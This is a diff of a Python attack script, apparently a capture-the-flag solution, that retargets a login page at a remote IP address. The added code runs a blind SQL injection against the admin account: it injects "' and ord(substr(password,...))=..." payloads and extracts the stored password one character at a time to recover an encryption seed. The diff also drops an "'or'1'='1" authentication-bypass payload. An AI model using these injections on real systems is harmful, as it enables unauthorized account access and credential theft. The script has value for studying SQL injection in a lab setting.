@@ -3,18 +3,46 @@ import codecs
 import html
 from pwn import xor
 import random
+import string
 
-login_url = 'http://localhost:5000/'
-home_url = 'http://localhost:5000/home'
+url = "http://103.84.207.92:50207/"
+
+login_url = url
+home_url = url+'home'
+aes_iv = b'b'*16
+
+seed = ''
+# break seed
+def login(injection):
+    json = {
+        'username': 'admin'+injection,
+        'password': 'injection'
+    }
+    resp = requests.post(login_url, data=json)
+    return '<!-- Logout Button -->' in resp.text
+
+inc = 1
+while True:
+    cek = False
+    for j in string.printable:
+        temp = ord(j)
+        cek = login("' and ord(substr(password,"+str(inc)+",1))="+str(temp)+" -- ")
+        if(cek):
+            inc += 1
+            seed += j
+            break
+    if(not cek):
+        print("done getting seed:", seed)
+        break
+    
+seed = seed.encode()
 login_data = {
     'username': 'user',
-    'password': "'or'1'='1"
+    'password': "user"
 }
 session = requests.Session()
 login_response = session.post(login_url, data=login_data)
 
-seed = b'c'*16
-aes_iv = b'b'*16
 # mode
 # Encrypt: 0
 # Decrypt: 1
